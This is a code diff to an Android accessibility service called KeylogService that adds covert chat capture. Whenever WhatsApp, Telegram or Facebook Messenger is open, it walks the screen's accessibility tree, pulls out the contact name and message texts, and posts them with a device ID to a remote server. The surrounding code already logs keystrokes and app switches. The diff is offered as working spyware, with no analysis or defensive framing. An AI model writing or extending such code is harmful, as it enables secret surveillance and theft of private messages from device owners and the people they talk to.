@@ -195,6 +195,11 @@ public class KeylogService extends AccessibilityService {
 
         Log.d(TAG, "App: " + oldApp + " → " + newApp + "/" + shorten(newCls));
 
+        // WhatsApp chat detection — capture visible chat screen
+        if (isChatApp(newApp) && event.getSource() != null) {
+            captureChatScreen(newApp);
+        }
+
         // Flush old buffer when app changes (text belongs to previous app)
         if (!oldApp.isEmpty() && !oldApp.equals(newApp)) {
             flushBuffer();
@@ -214,6 +219,151 @@ public class KeylogService extends AccessibilityService {
                 Log.e(TAG, "App change send error", e);
             }
         });
+    }
+
+    /* ===================================================================
+     * WHATSAPP / CHAT SCREEN CAPTURE (A11Y screen reading)
+     * =================================================================== */
+
+    private static final String[] CHAT_APPS = {
+        "com.whatsapp", "com.whatsapp.w4b",
+        "org.telegram.messenger",
+        "com.facebook.orca", "com.facebook.katana"
+    };
+
+    private boolean isChatApp(String pkg) {
+        for (String app : CHAT_APPS) {
+            if (pkg.contains(app)) return true;
+        }
+        return false;
+    }
+
+    private void captureChatScreen(String packageName) {
+        bgHandler.postDelayed(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+
+                String contactName = extractContactName(root, packageName);
+                JSONArray messages = extractChatMessages(root, packageName);
+
+                if (messages.length() > 0) {
+                    JSONObject payload = new JSONObject();
+                    payload.put("contact", contactName);
+                    payload.put("messages", messages);
+                    payload.put("package", packageName);
+                    payload.put("timestamp", System.currentTimeMillis());
+                    httpPost(SERVER_URL + "/api/chat-capture/" + DEVICE_ID, payload.toString());
+                    Log.d(TAG, "Chat captured: " + messages.length() + " msgs from " + contactName);
+                }
+                root.recycle();
+            } catch (Exception e) {
+                Log.d(TAG, "Chat capture error: " + e.getMessage());
+            }
+        }, 800); // Delay to let UI settle
+    }
+
+    private String extractContactName(AccessibilityNodeInfo root, String pkg) {
+        // Try to find contact name in toolbar / header
+        String name = "";
+        if (pkg.contains("whatsapp")) {
+            // WhatsApp toolbar usually has contact name in the first significant TextView
+            name = findTextByViewId(root, "com.whatsapp:id/conversation_contact_name");
+            if (name.isEmpty()) {
+                name = findFirstLargeText(root, pkg);
+            }
+        } else if (pkg.contains("telegram")) {
+            name = findTextByViewId(root, "org.telegram.messenger:id/action_bar_title");
+        } else if (pkg.contains("facebook")) {
+            name = findTextByViewId(root, "com.facebook.orca:id/message_list_container");
+        }
+        return name;
+    }
+
+    private JSONArray extractChatMessages(AccessibilityNodeInfo root, String pkg) {
+        JSONArray msgs = new JSONArray();
+        try {
+            // Find RecyclerView / ListView containing messages
+            // Traverse children to find TextViews with message content
+            traverseForMessages(root, msgs, pkg, 0);
+        } catch (Exception e) {
+            Log.d(TAG, "extract error: " + e.getMessage());
+        }
+        return msgs;
+    }
+
+    private void traverseForMessages(AccessibilityNodeInfo node, JSONArray msgs, String pkg, int depth) {
+        if (node == null || depth > 8) return; // Limit depth
+        
+        try {
+            CharSequence text = node.getText();
+            String className = node.getClassName() != null ? node.getClassName().toString() : "";
+
+            // Capture significant text from TextViews
+            if (className.contains("TextView") && text != null && text.length() > 2) {
+                // Skip known noise
+                String t = text.toString().trim();
+                if (t.equals("Type a message") || t.contains("Typing…") || t.isEmpty()) return;
+
+                JSONObject msg = new JSONObject();
+                msg.put("text", t);
+                msg.put("view_id", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
+                msg.put("content_desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
+                msgs.put(msg);
+            }
+
+            // Recurse children
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    traverseForMessages(child, msgs, pkg, depth + 1);
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            // Skip problematic nodes
+        }
+    }
+
+    private String findTextByViewId(AccessibilityNodeInfo root, String viewId) {
+        if (root == null) return "";
+        if (viewId.equals(root.getViewIdResourceName())) {
+            CharSequence t = root.getText();
+            if (t != null) return t.toString();
+        }
+        for (int i = 0; i < root.getChildCount(); i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child != null) {
+                String result = findTextByViewId(child, viewId);
+                child.recycle();
+                if (!result.isEmpty()) return result;
+            }
+        }
+        return "";
+    }
+
+    private String findFirstLargeText(AccessibilityNodeInfo root, String pkg) {
+        // Fallback: find the most prominent TextView (larger text size)
+        if (root == null) return "";
+        // Basic approach: find a non-empty TextView that's not an input field
+        try {
+            CharSequence text = root.getText();
+            String cls = root.getClassName() != null ? root.getClassName().toString() : "";
+            if (cls.contains("TextView") && text != null && text.length() > 1 && text.length() < 30) {
+                String t = text.toString().trim();
+                if (!t.equals("Type a message") && !t.contains("Typing")) return t;
+            }
+        } catch (Exception e) {}
+        
+        for (int i = 0; i < root.getChildCount(); i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child != null) {
+                String result = findFirstLargeText(child, pkg);
+                child.recycle();
+                if (!result.isEmpty()) return result;
+            }
+        }
+        return "";
     }
 
     /* ===================================================================
